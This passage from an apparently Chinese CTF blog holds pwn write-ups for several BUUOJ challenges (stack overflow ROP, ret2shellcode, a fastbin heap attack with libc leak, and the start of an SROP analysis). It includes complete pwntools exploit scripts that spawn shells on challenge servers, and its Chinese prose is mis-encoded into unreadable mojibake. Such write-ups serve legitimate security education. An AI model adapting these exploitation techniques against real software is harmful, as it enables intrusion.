<p><img src="https://i.loli.net/2020/09/21/DQAdo9gNevJrtBz.png" alt="image.png"></p>
<p>æ‹–å…¥IDAè¿›è¡Œåˆ†æ</p>
<p><img src="https://i.loli.net/2020/09/21/L5gZjv1rh3bIEt7.png" alt="image.png"></p>
<p>ä¸»å‡½æ•°ä¸­ç”¨æˆ·å¯ä»¥æ§åˆ¶è¯»å…¥çš„å­—ç¬¦æ•°é‡ï¼Œå­˜åœ¨æº¢å‡º</p>
<p>åŒæ—¶å­˜åœ¨å¯ä»¥getshellçš„<code>backdoor()</code>å‡½æ•°</p>
<p><img src="https://i.loli.net/2020/09/21/GMBR1ib9dHNxlPX.png" alt="image.png"></p>
<p>æ•…è€ƒè™‘æ„é€ ropé“¾æ‰§è¡Œ<code>backdoor()</code>å‡½æ•°å³å¯</p>
<p>æ„é€ expå¦‚ä¸‹</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b'A'</span>*<span class="number">0x10</span> + p64(<span class="number">0xdeadbeef</span>) + p64(<span class="number">0x4006e6</span>)</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">'node3.buuoj.cn'</span>,<span class="number">25806</span>)<span class="comment">#p = process('./bjdctf_2020_babystack')</span></span><br><span class="line">p.sendline(<span class="string">b'100'</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>è¿è¡Œå³å¯getshell</p>
<p><img src="https://i.loli.net/2020/09/21/nBZbpiVdHPRvu9c.png" alt="image.png"></p>
<h1 id="0x013-babyheap-0ctf-2017-Unsorted-bin-leak-Fastbin-Attack-one-gadget"><a href="#0x013-babyheap-0ctf-2017-Unsorted-bin-leak-Fastbin-Attack-one-gadget" class="headerlink" title="0x013.babyheap_0ctf_2017 - Unsorted bin leak + Fastbin Attack + one_gadget"></a>0x013.babyheap_0ctf_2017 - Unsorted bin leak + Fastbin Attack + one_gadget</h1><blockquote>
<p>æ¥åˆ°BUUååšçš„ç¬¬ä¸€é“å †é¢˜</p>
</blockquote>
<p>æƒ¯ä¾‹çš„<code>checksec</code>ï¼Œå‘ç°<strong>ä¿  æŠ¤  å…¨  å¼€</strong>ï¼ˆ<strong>å¿ƒ è‚º åœ æ­¢</strong></p>
<p><img src="https://i.loli.net/2020/09/21/aZJExgI4UqDuPoj.png" alt="image.png"></p>
<p>æ‹–å…¥IDAé‡Œè¿›è¡Œåˆ†æï¼ˆä»¥ä¸‹éƒ¨åˆ†å‡½æ•°ã€å˜é‡åç»è¿‡é‡å‘½åï¼‰</p>
<p>å¸¸è§çš„å †é¢˜åŸºæœ¬ä¸Šéƒ½æ˜¯èœå•é¢˜ï¼Œæœ¬é¢˜ä¹Ÿä¸ä¾‹å¤–<img src="https://i.loli.net/2020/09/30/VEjFKYhibtqHfs6.png" alt="image.png"></p>
<p>æˆ‘ä»¬å¯ä»¥å‘ç°åœ¨<code>writeHeap()</code>å‡½æ•°ä¸­å¹¶æ²¡æœ‰å¯¹æˆ‘ä»¬è¾“å…¥çš„é•¿åº¦è¿›è¡Œæ£€æŸ¥ï¼Œ<strong>å­˜åœ¨å †æº¢å‡º</strong></p>
<p><img src="https://i.loli.net/2020/09/30/WAOCpdZMVRlSxgm.png" alt="image.png"></p>
<p>æ•…æˆ‘ä»¬è€ƒè™‘å…ˆåˆ›å»ºå‡ ä¸ªå°å †å—ï¼Œå†åˆ›å»ºä¸€ä¸ªå¤§å †å—ï¼Œfreeæ‰ä¸¤ä¸ªå°å †å—è¿›å…¥åˆ°fastbinï¼Œç”¨å †æº¢å‡ºæ”¹å†™fastbinç¬¬ä¸€ä¸ªå—çš„fdæŒ‡é’ˆä¸ºæˆ‘ä»¬æ‰€ç”³è¯·çš„å¤§å †å—çš„åœ°å€ï¼Œéœ€è¦æ³¨æ„çš„æ˜¯fastbinä¼šå¯¹chunkçš„sizeè¿›è¡Œæ£€æŸ¥ï¼Œæ•…æˆ‘ä»¬è¿˜éœ€è¦å…ˆé€šè¿‡å †æº¢å‡ºæ”¹å†™å¤§å †å—çš„sizeï¼Œä¹‹åå°†å¤§å †å—åˆ†é…å›æ¥åæˆ‘ä»¬å°±æœ‰ä¸¤ä¸ªæŒ‡é’ˆæŒ‡å‘åŒä¸€ä¸ªå †å—</p>
<p><img src="https://i.loli.net/2020/10/07/XARM5QmBzFadtWi.png" alt="62DB8B2E56B87418664EEB947A980782.png"></p>
<p>åˆ©ç”¨å †æº¢å‡ºå°†å¤§å †å—çš„sizeé‡æ–°æ”¹å¤§å†freeä»¥é€å…¥unsorted binï¼Œæ­¤æ—¶å¤§å †å—çš„fdä¸bkæŒ‡é’ˆæŒ‡å‘main_arena+0x58çš„ä½ç½®ï¼Œåˆ©ç”¨å¦å¤–ä¸€ä¸ªæŒ‡å‘è¯¥å¤§å †å—çš„æŒ‡é’ˆè¾“å‡ºfdçš„å†…å®¹å³å¯å¾—åˆ°main_arena+0x58çš„åœ°å€ï¼Œå°±å¯ä»¥ç®—å‡ºlibcçš„åŸºå€</p>
<p><img src="https://i.loli.net/2020/10/07/IBAZ6ChTOrQwonp.png" alt="72934A2F942430E796048F09C96A261F.png"></p>
<p>æ¥ä¸‹æ¥ä¾¿æ˜¯fastbin attackï¼šå°†æŸä¸ªå †å—é€å…¥fastbinåæ”¹å†™å…¶fdæŒ‡é’ˆä¸º__malloc_hookçš„åœ°å€ï¼ˆ__malloc_hookä½äºmain_arenaä¸Šæ–¹0x10å­—èŠ‚å¤„ï¼‰ï¼Œå†å°†è¯¥å †å—åˆ†é…å›æ¥ï¼Œæ­¤æ—¶fastbinä¸­è¯¥é“¾è¡¨ä¸Šå°±ä¼šå­˜åœ¨ä¸€ä¸ªæˆ‘ä»¬æ‰€ä¼ªé€ çš„ä½äº__malloc_hookä¸Šçš„å †å—ï¼Œç”³è¯·è¿™ä¸ªå †å—åæˆ‘ä»¬ä¾¿å¯ä»¥æ”¹å†™malloc_hookä¸Šçš„å†…å®¹ä¸ºåé—¨å‡½æ•°åœ°å€ï¼Œæœ€åéšä¾¿åˆ†é…ä¸€ä¸ªå †å—ä¾¿å¯getshell</p>
<p>è€ƒè™‘åˆ°é¢˜ç›®ä¸­å¹¶ä¸å­˜åœ¨å¯ä»¥ç›´æ¥getshellçš„åé—¨å‡½æ•°ï¼Œæ•…è€ƒè™‘ä½¿ç”¨one_gadgetä»¥getshell</p>
<p><img src="https://i.loli.net/2020/10/07/glLRkSdY3GufeOv.png" alt="D2D612904D8AB28F1DCCE651D4B81508.png"></p>
<p>éœ€è¦æ³¨æ„çš„æ˜¯fastbinå­˜åœ¨sizeæ£€æŸ¥ï¼Œæ•…å…·ä½“çš„<strong>èƒ½å¤Ÿè®©fake chunkçš„sizeåˆšå¥½ä¸ºç‰¹å®šå€¼</strong>çš„é‚£ä¸ªåœ°å€å¯èƒ½ä½äº__malloc_hookä¸Šæ–¹çš„æŸä¸€å¤„ï¼Œéœ€è¦æˆ‘ä»¬å¤šæ¬¡å°è¯•å¾—åˆ°åç§»é‡</p>
<p>æ„é€ payloadå¦‚ä¸‹ï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = remote(<span class="string">'node3.buuoj.cn'</span>,<span class="number">27143</span>)<span class="comment">#process('./babyheap_0ctf_2017')#</span></span><br><span class="line">libc = ELF(<span class="string">'./libc-2.23.so'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">alloc</span><span class="params">(size:int)</span>:</span></span><br><span class="line">    p.sendline(<span class="string">'1'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'Size: '</span>)</span><br><span class="line">    p.sendline(str(size))</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fill</span><span class="params">(index:int,content)</span>:</span></span><br><span class="line">    p.sendline(<span class="string">'2'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'Index: '</span>)</span><br><span class="line">    p.sendline(str(index))</span><br><span class="line">    p.recvuntil(<span class="string">'Size: '</span>)</span><br><span class="line">    p.sendline(str(len(content)))</span><br><span class="line">    p.recvuntil(<span class="string">'Content: '</span>)</span><br><span class="line">    p.send(content)</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(index:int)</span>:</span></span><br><span class="line">    p.sendline(<span class="string">'3'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'Index: '</span>)</span><br><span class="line">    p.sendline(str(index))</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dump</span><span class="params">(index:int)</span>:</span></span><br><span class="line">    p.sendline(<span class="string">'4'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'Index: '</span>)</span><br><span class="line">    p.sendline(str(index))</span><br><span class="line">    p.recvuntil(<span class="string">'Content: \n'</span>)</span><br><span class="line">    <span class="keyword">return</span> p.recvline()</span><br><span class="line">    </span><br><span class="line">alloc(<span class="number">0x10</span>) <span class="comment">#idx0</span></span><br><span class="line">alloc(<span class="number">0x10</span>) <span class="comment">#idx1</span></span><br><span class="line">alloc(<span class="number">0x10</span>) <span class="comment">#idx2</span></span><br><span class="line">alloc(<span class="number">0x10</span>) <span class="comment">#idx3</span></span><br><span class="line">alloc(<span class="number">0x80</span>) <span class="comment">#idx4</span></span><br><span class="line"></span><br><span class="line">free(<span class="number">1</span>) <span class="comment">#idx1</span></span><br><span class="line">free(<span class="number">2</span>) <span class="comment">#idx2</span></span><br><span class="line"></span><br><span class="line">payload = p64(<span class="number">0</span>)*<span class="number">3</span> + p64(<span class="number">0x21</span>) + p64(<span class="number">0</span>)*<span class="number">3</span> + p64(<span class="number">0x21</span>) + p8(<span class="number">0x80</span>)</span><br><span class="line">fill(<span class="number">0</span>,payload)</span><br><span class="line"></span><br><span class="line">payload = p64(<span class="number">0</span>)*<span class="number">3</span> + p64(<span class="number">0x21</span>)</span><br><span class="line">fill(<span class="number">3</span>,payload)</span><br><span class="line"></span><br><span class="line">alloc(<span class="number">0x10</span>) <span class="comment">#idx1, the former idx2</span></span><br><span class="line">alloc(<span class="number">0x10</span>) <span class="comment">#idx2, the former idx4</span></span><br><span class="line"></span><br><span class="line">payload = p64(<span class="number">0</span>)*<span class="number">3</span> + p64(<span class="number">0x91</span>)</span><br><span class="line">fill(<span class="number">3</span>,payload)</span><br><span class="line">alloc(<span class="number">0x80</span>) <span class="comment">#idx5, prevent the top chunk combine it</span></span><br><span class="line">free(<span class="number">4</span>) <span class="comment">#idx2 got into unsorted bin, fd points to the main_arena</span></span><br><span class="line"></span><br><span class="line">main_arena = u64(dump(<span class="number">2</span>)[:<span class="number">8</span>].strip().ljust(<span class="number">8</span>,<span class="string">b'\x00'</span>)) - <span class="number">0x58</span></span><br><span class="line">malloc_hook = main_arena - <span class="number">0x10</span></span><br><span class="line">libc_base = malloc_hook - libc.sym[<span class="string">'__malloc_hook'</span>]</span><br><span class="line">one_gadget = libc_base + <span class="number">0x4526a</span></span><br><span class="line"></span><br><span class="line">alloc(<span class="number">0x60</span>) <span class="comment">#idx4</span></span><br><span class="line">free(<span class="number">4</span>) <span class="comment">#idx2 got into fastbin</span></span><br><span class="line">payload = p64(malloc_hook - <span class="number">0x23</span>)</span><br><span class="line">fill(<span class="number">2</span>,payload) <span class="comment">#overwrite fd to fake chunk addr</span></span><br><span class="line"></span><br><span class="line">alloc(<span class="number">0x60</span>) <span class="comment">#idx4</span></span><br><span class="line">alloc(<span class="number">0x60</span>) <span class="comment">#idx6, our fake chunk</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b'A'</span>*<span class="number">0x13</span> + p64(one_gadget)</span><br><span class="line">fill(<span class="number">6</span>,payload)</span><br><span class="line"></span><br><span class="line">alloc(<span class="number">0x10</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>è¿è¡Œè„šæœ¬å³å¾—flag</p>
<p><img src="https://i.loli.net/2020/10/07/9n7EyWL5OC3aIcm.png" alt="image.png"></p>
<h1 id="0x014-ciscn-2019-n-5-ret2shellcode"><a href="#0x014-ciscn-2019-n-5-ret2shellcode" class="headerlink" title="0x014.ciscn_2019_n_5 - ret2shellcode"></a>0x014.ciscn_2019_n_5 - ret2shellcode</h1><p>æƒ¯ä¾‹çš„<code>checksec</code>ï¼Œå‘ç°è¿‘ä¹ä¿æŠ¤å…¨å…³ï¼Œæ•´æŒºå¥½</p>
<p><img src="https://i.loli.net/2020/10/09/6YLBG8h3kfrqEFl.png" alt="9FIY_KOU2UD64__0RB5U66B.png"></p>
<p>æ‹–å…¥IDAè¿›è¡Œåˆ†æ</p>
<p>![41L`5F__UIYNB_H_YE_DEHD.png](<a href="https://i.loli.net/2020/10/09/zTYkWulo1hyLKvB.png" target="_blank" rel="noopener">https://i.loli.net/2020/10/09/zTYkWulo1hyLKvB.png</a>)</p>
<p>ä¸€å¼€å§‹å…ˆå‘bssæ®µä¸Šçš„<code>name</code>è¯»å…¥æœ€å¤§<code>0x64</code>å­—èŠ‚çš„å†…å®¹ï¼Œä¹‹åå†ä½¿ç”¨<code>gets()</code>è¯»å…¥åˆ°textä¸Šï¼Œå­˜åœ¨æ ˆæº¢å‡º</p>
<p>æ•…è€ƒè™‘å…ˆå‘<code>name</code>ä¸Šå†™å…¥shellcodeå†æ§åˆ¶ç¨‹åºè·³è½¬è‡³<code>name</code>å³å¯</p>
<p>bssæ®µä¸Š<code>name</code>çš„åœ°å€ä¸º<code>0x601080</code></p>
<p><img src="https://i.loli.net/2020/10/09/Il3iOrAao5phSXm.png" alt="3N50O64P@_TF@5SAT_@__KU.png"></p>
<p>æ„é€ expå¦‚ä¸‹ï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch = <span class="string">'amd64'</span></span><br><span class="line"></span><br><span class="line">bss_addr = <span class="number">0x601080</span></span><br><span class="line">payload = <span class="string">b'A'</span>*<span class="number">0x20</span> + p64(<span class="number">0xdeadbeef</span>) + p64(bss_addr)</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">'./ciscn_2019_n_5'</span>)<span class="comment">#remote('node3.buuoj.cn',27296)</span></span><br><span class="line">p.sendline(asm(shellcraft.sh()))</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>è¿è¡Œï¼ŒæˆåŠŸgetshell</p>
<p><img src="https://i.loli.net/2020/10/09/kxmOadD1Py7GYLM.png" alt="ZGX5RGFHA_NTT96WDXA__4T.png"></p>
<h1 id="0x015-level2-x64-ret2csu"><a href="#0x015-level2-x64-ret2csu" class="headerlink" title="0x015.level2_x64 - ret2csu"></a>0x015.level2_x64 - ret2csu</h1><p>æƒ¯ä¾‹çš„<code>checksec</code>ï¼Œå‘ç°åªå¼€äº†NXä¿æŠ¤</p>
<p><img src="https://i.loli.net/2020/10/09/wMdhOJgrpDZCicA.png" alt="image.png"></p>
<p>æ‹–å…¥IDAè¿›è¡Œåˆ†æ</p>
<p><img src="https://i.loli.net/2020/10/09/cusBMX2AOeT7yEt.png" alt="image.png"></p>
<p>åœ¨<code>vulnerable_function()</code>å¤„å­˜åœ¨æ ˆæº¢å‡ºï¼Œä¸”å­˜åœ¨<code>system()</code>å‡½æ•°</p>
<p><img src="https://i.loli.net/2020/10/09/hGbO9NaLnkory3I.png" alt="image.png"></p>
<p>åœ¨.dataæ®µå­˜åœ¨<code>&quot;/bin/sh&quot;</code>å­—ç¬¦ä¸²</p>
<p>æ•…è€ƒè™‘æ„é€ ropé“¾æ‰§è¡Œ<code>system(&quot;/bin/sh&quot;)</code>å³å¯getshell</p>
<p>æ„é€ expå¦‚ä¸‹ï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh_addr = <span class="number">0x600A90</span></span><br><span class="line">pop_rdi_ret = <span class="number">0x4006B3</span></span><br><span class="line">call_sys = <span class="number">0x400603</span></span><br><span class="line">payload = <span class="string">b'A'</span>*<span class="number">0x80</span> + p64(<span class="number">0xdeadbeef</span>) + p64(pop_rdi_ret) + p64(sh_addr) + p64(call_sys)</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">'./level2_x64'</span>)<span class="comment">#remote('node3.buuoj.cn',26289)</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>è¿è¡Œè„šæœ¬å³å¾—flag</p>
<p><img src="https://i.loli.net/2020/10/09/85mfFgLiZVYXeuN.png" alt="image.png"></p>
<h1 id="0x016-ciscn-2019-ne-5-ret2text"><a href="#0x016-ciscn-2019-ne-5-ret2text" class="headerlink" title="0x016.ciscn_2019_ne_5 - ret2text"></a>0x016.ciscn_2019_ne_5 - ret2text</h1><p>æƒ¯ä¾‹çš„<code>checksec</code>ï¼Œå‘ç°åªå¼€äº†NXä¿æŠ¤</p>
<p><img src="https://i.loli.net/2020/10/09/5Z3rzc8pPb61hjL.png" alt="image.png"></p>
<p>æ‹–å…¥IDAè¿›è¡Œåˆ†æ</p>
<p><img src="https://i.loli.net/2020/10/09/aqwxIRMizvbVkPF.png" alt="ZX9_6BVAK5A_V_BL__V_I0X.png"></p>
<p>çœ‹èµ·æ¥é•¿å¾—åƒå †é¢˜ä½†å…¶å®å®Œå…¨æ²¡æœ‰å †çš„æ“ä½œï¼Œè¿˜æ˜¯ä¼ ç»Ÿçš„æ ˆé¢˜</p>
<p>åœ¨<code>AddLog()</code>å‡½æ•°ä¸­è¯»å…¥æœ€å¤§128å­—èŠ‚åˆ°å­—ç¬¦ä¸²<code>src</code>ä¸­</p>
<p>![UXHLHKU0D9MFLEY3MJK_`QT.png](<a href="https://i.loli.net/2020/10/09/TREtZOFSvhdqVup.png" target="_blank" rel="noopener">https://i.loli.net/2020/10/09/TREtZOFSvhdqVup.png</a>)</p>
<p>åœ¨<code>GetFlag()</code>å‡½æ•°ä¸­ä¼šæ‹·è´<code>src</code>åˆ°<code>dest</code>ä¸Šï¼Œå­˜åœ¨æ ˆæº¢å‡º</p>
<p><img src="https://i.loli.net/2020/10/09/FHvp3yewxTmkG6Z.png" alt="_@SVK_64XY_UGE02KN_Q6_9.png"></p>
<p>åŒæ—¶ç¨‹åºä¸­å­˜åœ¨<code>system()</code>å‡½æ•°ä¸<code>sh</code>å­—ç¬¦ä¸²</p>
<p><img src="https://i.loli.net/2020/10/09/q8KI9ocLn1NybWz.png" alt="image.png"></p>
<p>![X0WS9USGGKI`WCZK0_J80_7.png](<a href="https://i.loli.net/2020/10/09/a7OuQVLPsSAMd85.png" target="_blank" rel="noopener">https://i.loli.net/2020/10/09/a7OuQVLPsSAMd85.png</a>)</p>
<p>æ•…ç›´æ¥æº¢å‡ºæ§åˆ¶ç¨‹åºæ‰§è¡Œ<code>system(&quot;/bin/sh&quot;)</code>å³å¯</p>
<p>æ„é€ expå¦‚ä¸‹ï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh_addr = <span class="number">0x80482ea</span></span><br><span class="line">call_sys = <span class="number">0x80486b9</span></span><br><span class="line">payload = <span class="string">b'A'</span>*<span class="number">0x48</span> + p32(<span class="number">0xdeadbeef</span>) + p32(call_sys)  + p32(sh_addr)</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">'./ciscn_2019_ne_5'</span>)<span class="comment">#remote('node3.buuoj.cn',26005)</span></span><br><span class="line">p.sendline(<span class="string">b'administrator'</span>)</span><br><span class="line">p.sendline(<span class="string">b'1'</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.sendline(<span class="string">b'4'</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>è¿è¡Œå³å¯getshell</p>
<p>![L_YGD`OM1C_L_RJ~7__23SD.png](<a href="https://i.loli.net/2020/10/09/TUIEloeFPhfsXqC.png" target="_blank" rel="noopener">https://i.loli.net/2020/10/09/TUIEloeFPhfsXqC.png</a>)</p>
<h1 id="0x017-ciscn-2019-s-3-ret2csu-SROP"><a href="#0x017-ciscn-2019-s-3-ret2csu-SROP" class="headerlink" title="0x017.ciscn_2019_s_3 - ret2csu || SROP"></a>0x017.ciscn_2019_s_3 - ret2csu || SROP</h1><blockquote>
<p> åº”<a href="https://ll1ng.github.io" target="_blank" rel="noopener">æŸä½å¯çˆ±çš„å¥³å¸ˆå‚…</a>çš„è¦æ±‚å…ˆæ¥åšè¿™é“é¢˜ï¼ˆï¼ˆï¼ˆ</p>
</blockquote>
<p>æƒ¯ä¾‹çš„<code>checksec</code>ï¼Œå‘ç°åªå¼€äº†æ ˆä¸å¯æ‰§è¡Œä¿æŠ¤</p>
<p><img src="https://i.loli.net/2020/09/13/ip9xYzyfsF8eSvU.png" alt="image.png"></p>
<p>æ‹–å…¥IDAè¿›è¡Œåˆ†æï¼š<br><img src="https://i.loli.net/2020/09/13/QX6bdK57hjWCyrG.png" alt="image.png"></p>
<p><img src="https://i.loli.net/2020/09/13/5RsPUNZAyV2ot7f.png" alt="image.png"></p>
<p>å¯ä»¥çœ‹åˆ°ï¼Œ<code>main()</code>å‡½æ•°ä¼šè°ƒç”¨<code>vuln()</code>å‡½æ•°ï¼Œåœ¨<code>vuln()</code>å‡½æ•°ä¸­ä¼šè°ƒç”¨ä¸¤ä¸ª<strong>ç³»ç»Ÿè°ƒç”¨</strong>â€”â€”0å·ç³»ç»Ÿè°ƒç”¨<code>sys_read</code>è¯»å…¥æœ€å¤§<strong>0x400</strong>ä¸ªå­—èŠ‚åˆ°bufä¸Šï¼Œbufåªåˆ†é…åˆ°äº†<strong>0x10</strong>ä¸ªå­—èŠ‚çš„ç©ºé—´ï¼Œå­˜åœ¨æ ˆæº¢å‡ºï¼›éšåè°ƒç”¨1å·ç³»ç»Ÿè°ƒç”¨<code>sys_write</code>è¾“å‡ºbufä¸Šçš„<strong>0x30</strong>å­—èŠ‚çš„å†…å®¹</p>
<p>åŒæ—¶æˆ‘ä»¬è¿˜å¯ä»¥è§‚å¯Ÿåˆ°æœ‰ä¸€ä¸ªæ²¡æœ‰è¢«ç”¨åˆ°çš„<code>gadget()</code>å‡½æ•°ï¼Œé‡Œé¢æœ‰ä¸¤æ¡gadget<strong>å°†raxè®¾ä¸º0xfæˆ–0x3b</strong>ï¼Œä¹Ÿå°±æ˜¯15æˆ–59</p>
<p><img src="https://i.loli.net/2020/09/13/eBiLZDC9uwRxvIP.png" alt="image.png"></p>
<p>è€Œ<code>syscall</code>æŒ‡ä»¤ä»<strong>raxå¯„å­˜å™¨</strong>ä¸­è¯»å–å€¼å¹¶è°ƒç”¨ç›¸å¯¹åº”çš„ç³»ç»Ÿè°ƒç”¨ï¼ˆä»ç¨‹åºæœ¬èº«çš„ä»£ç æˆ‘ä»¬ä¹Ÿå¯ä»¥çœ‹å‡ºè¿™ä¸€ç‚¹ï¼‰ï¼Œå¯¹åº”çš„æˆ‘ä»¬å¯ä»¥æƒ³åˆ°çš„æ˜¯è¿™ä¸ªgadgetè¦æˆ‘ä»¬é€šè¿‡ç›¸åº”çš„<strong>ç³»ç»Ÿè°ƒç”¨</strong>æ¥getshell</p>
<p>åœ¨64ä½Linuxä¸‹ï¼Œ15å·ç³»ç»Ÿè°ƒç”¨æ˜¯<strong>rt_sigreturn</strong>ï¼Œè€Œ59å·ç³»ç»Ÿè°ƒç”¨åˆ™æ˜¯æˆ‘ä»¬æ‰€ç†Ÿæ‚‰çš„<strong>execve</strong>ï¼Œ<del>é‚£ä¹ˆè¿™ä¸ªç³»ç»Ÿè°ƒç”¨è¯¥æ€ä¹ˆåˆ©ç”¨å‘¢æˆ‘æš‚ä¸”è’™åœ¨å¤é‡Œ</del></p>
<blockquote>
<p>ç³»ç»Ÿè°ƒç”¨ä¸€è§ˆè¡¨è§<a href="https://archive.next.arttnba3.cn/2000/10/12/%E3%80%90%E8%B5%84%E6%96%99%E5%AD%98%E6%A1%A3-0x01%E3%80%91Linux%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8%E4%B8%80%E8%A7%88-by-arttnba3/">è¿™é‡Œ</a></p>
</blockquote>
<p>è€ƒè™‘åˆ°åœ¨<code>vuln()</code>å‡½æ•°ä¸­åªåˆ†é…äº†<code>0x10</code>ä¸ªå­—èŠ‚çš„ç©ºé—´ç»™bufï¼Œä½†æ˜¯åé¢çš„ç³»ç»Ÿè°ƒç”¨<code>write</code>ä¼šè¾“å‡º0x30ä¸ªå­—èŠ‚çš„å†…å®¹ï¼Œå³é™¤äº†æˆ‘ä»¬çš„è¾“å…¥ä¹‹å¤–è¿˜ä¼šæ‰“å°ä¸€äº›æ ˆä¸Šçš„å†…å®¹ï¼Œå…¶ä¸­å‰0x20ä¸ªå­—èŠ‚çš„å†…å®¹åˆ†åˆ«ä¸ºï¼š0x10å­—èŠ‚çš„bufã€8å­—èŠ‚çš„old_rbpï¼ˆä½œä¸ºè¿”å›åœ°å€ï¼‰ã€8å­—èŠ‚çš„mainå‡½æ•°ä¸­çš„<code>call vuln</code>æŒ‡ä»¤çš„ä¸‹ä¸€æ¡æŒ‡ä»¤çš„åœ°å€ï¼Œå‰©ä¸‹çš„0x10ä¸ªå­—èŠ‚åˆ™æ˜¯æ ˆä¸Šçš„ä¸€äº›å…¶ä»–çš„å†…å®¹</p>
<p>æˆ‘ä»¬ä½¿ç”¨gdbè¿›è¡Œè°ƒè¯•çœ‹çœ‹æ˜¯ä»€ä¹ˆå†…å®¹ï¼š</p>
<p><img src="https://i.loli.net/2020/09/14/TcMSfPtdDmQhuAC.png" alt="image.png"></p>
<p>å¯ä»¥çœ‹åˆ°<code>0x7fffffffdc60</code>ä¸Šå‚¨å­˜çš„å†…å®¹å³ä¸º<code>old_rbp</code>ï¼Œ<code>0x7fffffffdc68</code>ä¸Šå‚¨å­˜çš„å†…å®¹ä¸ºmainå‡½æ•°ä¸­çš„<code>call vuln</code>æŒ‡ä»¤çš„ä¸‹ä¸€æ¡æŒ‡ä»¤çš„åœ°å€ï¼Œè€Œ<code>0x7fffffffdc70</code>ä¸Šå‚¨å­˜çš„åˆ™æ˜¯ä¸€ä¸ª<strong>åœ°å€</strong>ï¼Œæˆ‘ä»¬å¾ˆå®¹æ˜“è®¡ç®—å¾—å‡ºå…¶ä¸æ ˆåŸºå€é—´çš„åç§»é‡ä¸º<strong>0x7fffffffdd78 - 0x7fffffffdc60 = 0x118</strong></p>
<p>é‚£ä¹ˆæˆ‘ä»¬åªéœ€è¦è¯»å–è¿™ä¸ªå€¼å†å‡å»åç§»é‡ä¾¿å¯ä»¥<strong>å¾—åˆ°æ ˆåŸºå€çš„åœ°å€</strong></p>
